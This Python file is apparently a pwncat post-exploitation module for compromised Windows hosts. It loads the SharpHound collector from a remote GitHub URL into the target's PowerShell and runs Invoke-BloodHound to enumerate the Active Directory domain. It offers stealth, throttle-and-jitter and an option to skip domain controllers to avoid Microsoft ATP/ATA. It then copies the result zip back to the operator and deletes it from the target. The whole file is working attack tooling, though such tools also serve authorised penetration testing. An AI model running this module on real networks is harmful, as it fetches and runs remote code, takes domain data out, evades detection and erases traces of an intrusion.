#!/usr/bin/env python3
import shlex
import shutil

from pwncat.modules import Bool, List, Status, Argument, BaseModule, ModuleFailed
from pwncat.platform.windows import Windows, PowershellError


class Module(BaseModule):
    """Load the Invoke-BloodHound cmdlet and execute it. Automatically download the
    resulting zip file to a defined location and remove it from the target."""

    PLATFORM = [Windows]
    ARGUMENTS = {
        "CollectionMethod": Argument(
            List(str),
            default=None,
            help="Specifies the collection method(s) to be used.",
        ),
        "Stealth": Argument(
            Bool,
            default=None,
            help="Use the stealth collection options (default: false)",
        ),
        "Domain": Argument(
            str,
            default=None,
            help="Specifies the domain to enumerate (default: current)",
        ),
        "WindowsOnly": Argument(
            Bool,
            default=None,
            help="Limits computer collection to systems that have an operatingsystem attribute that matches *Windows",
        ),
        "ZipFilename": Argument(
            str, help="Name for the zip file output by data collection"
        ),
        "NoSaveCache": Argument(
            Bool,
            default=None,
            help="Don't write the cache file to disk. Caching will still be performed in memory.",
        ),
        "EncryptZip": Argument(
            Bool, default=None, help="Encrypt the zip file with a random password"
        ),
        "InvalidateCache": Argument(
            Bool, default=None, help="Invalidate and rebuild the cache file"
        ),
        "SearchBase": Argument(
            str,
            default=None,
            help="DistinguishedName at which to start LDAP searches. Equivalent to the old -Ou option",
        ),
        "LdapFilter": Argument(
            str,
            default=None,
            help="Append this ldap filter to the search filter to further filter the results enumerated",
        ),
        "DomainController": Argument(
            str,
            default=None,
            help="Domain controller to which to connect. Specifying this can result in data loss",
        ),
        "LdapPort": Argument(
            int,
            default=None,
            help="Port LDAP is running on (default: 389/686 for LDAPS)",
        ),
        "SecureLDAP": Argument(
            Bool,
            default=None,
            help="Connect to LDAPS (LDAP SSL) instead of regular LDAP",
        ),
        "DisableKerberosSigning": Argument(
            Bool,
            default=None,
            help="Disables kerberos signing/sealing, making LDAP traffic viewable",
        ),
        "LdapUsername": Argument(
            str,
            default=None,
            help="Username for connecting to LDAP. Use this if you're using a non-domain account for connecting to computers",
        ),
        "LdapPassword": Argument(
            str, default=None, help="Password for connecting to LDAP"
        ),
        "SkipPortScan": Argument(
            Bool, default=None, help="Skip SMB port checks when connecting to computers"
        ),
        "PortScanTimeout": Argument(
            int, default=None, help="Timeout for SMB port checks"
        ),
        "ExcludeDomainControllers": Argument(
            Bool,
            default=None,
            help="Exclude domain controllers from enumeration (useful to avoid Microsoft ATP/ATA)",
        ),
        "Throttle": Argument(
            int, default=None, help="Throttle requests to computers (in milliseconds)"
        ),
        "Jitter": Argument(int, default=None, help="Add jitter to throttle"),
        "OverrideUserName": Argument(
            str, default=None, help="Override username to filter for NetSessionEnum"
        ),
        "NoRegistryLoggedOn": Argument(
            Bool,
            default=None,
            help="Disable remote registry check in LoggedOn collection",
        ),
        "DumpComputerStatus": Argument(
            Bool,
            default=None,
            help="Dumps error codes from attempts to connect to computers",
        ),
        "RealDNSName": Argument(
            str, default=None, help="Overrides the DNS name used for API calls"
        ),
        "CollectAllProperties": Argument(
            Bool, default=None, help="Collect all string LDAP properties on objects"
        ),
        "StatusInterval": Argument(
            int, default=None, help="Interval for displaying status in milliseconds"
        ),
        "Loop": Argument(
            Bool, default=None, help="Perform looping for computer collection"
        ),
        "LoopDuration": Argument(
            str, default=None, help="Duration to perform looping (default: 02:00:00)"
        ),
        "LoopInterval": Argument(
            str,
            default=None,
            help="Interval to sleep between loops (default: 00:05:00)",
        ),
    }
    SHARPHOUND_URL = "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1"

    def run(self, session: "pwncat.manager.Session", **kwargs):

        # First, we need to load BloodHound
        try:
            yield Status("importing Invoke-BloodHound cmdlet")
            session.run("manage.powershell.import", path=self.SHARPHOUND_URL)
        except (ModuleFailed, PowershellError) as exc:
            raise ModuleFailed(f"while importing Invoke-BloodHound: {exc}")

        # Try to create a temporary file. We're just going to delete it, but
        # this gives us a tangeable temporary path to put the zip file.
        yield Status("locating a suitable temporary file location")
        with session.platform.tempfile(suffix=".zip", mode="w") as filp:
            file_path = filp.name

        path = session.platform.Path(file_path)
        path.unlink()

        # Note the local path to the downloaded zip file and set it to our temp
        # file path we just created/deleted.
        output_path = kwargs["ZipFilename"]
        kwargs["ZipFilename"] = str(path)

        # Build the arguments
        bloodhound_args = {k: v for k, v in kwargs.items() if v is not None}
        argument_list = ["Invoke-BloodHound"]

        for k, v in bloodhound_args.items():
            if isinstance(v, bool) and v:
                argument_list.append(f"-{k}")
            elif not isinstance(v, bool):
                argument_list.append(f"-{k}")
                argument_list.append(str(v))

        powershell_command = shlex.join(argument_list)

        # Execute BloodHound
        try:
            yield Status("executing bloodhound collector")
            session.platform.powershell(powershell_command)
        except (ModuleFailed, PowershellError) as exc:
            raise ModuleFailed(f"Invoke-BloodHound: {exc}")

        # Download the contents of the zip file
        try:
            yield Status(f"downloading results to {output_path}")
            with open(output_path, "wb") as dst:
                with path.open("rb") as src:
                    shutil.copyfileobj(src, dst)
        except (FileNotFoundError, PermissionError) as exc:
            if output_path in str(exc):
                try:
                    path.unlink()
                except FileNotFoundError:
                    pass
                raise ModuleFailed(f"permission error: {output_path}") from exc
            raise ModuleFailed("bloodhound failed or access to output was denied")

        # Delete the zip from the target
        yield Status(f"deleting collected results from target")
        path.unlink()
